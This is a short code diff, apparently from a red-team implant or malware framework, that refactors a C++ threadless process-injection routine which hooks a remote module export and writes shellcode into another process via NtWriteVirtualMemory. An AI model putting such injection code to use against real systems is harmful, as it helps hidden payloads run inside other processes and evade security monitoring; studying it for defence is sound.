@@ -16,7 +16,7 @@ namespace Injection {
         UINT_PTR hook       = 0;
         SIZE_T write        = 0;
 
-        if (!(ex_addr = Memory::Modules::GetExportAddress(S_CAST(LPSTR, threadless.Module.Buffer), R_CAST(LPSTR, threadless.Export.Buffer))) ||
+        if (!(ex_addr = Memory::Modules::LoadExportAddress(threadless.Module.Buffer, threadless.Export.Buffer)) ||
             !(process = Process::GetParentHandle(R_CAST(PBYTE, threadless.Parent.Buffer))) ||
             !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), n_shellcode))) {
             return;
@@ -40,7 +40,7 @@ namespace Injection {
             return_defer(ntstatus);
         }
 
-        //Xtea::XteaCrypt(R_CAST(PBYTE, Shellcode), n_shellcode, Ctx->Config.Key, FALSE);
+        //Xtea::XteaCrypt(R_CAST(PBYTE, shellcode), n_shellcode, Ctx->Config.Key, FALSE);
 
         if (
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
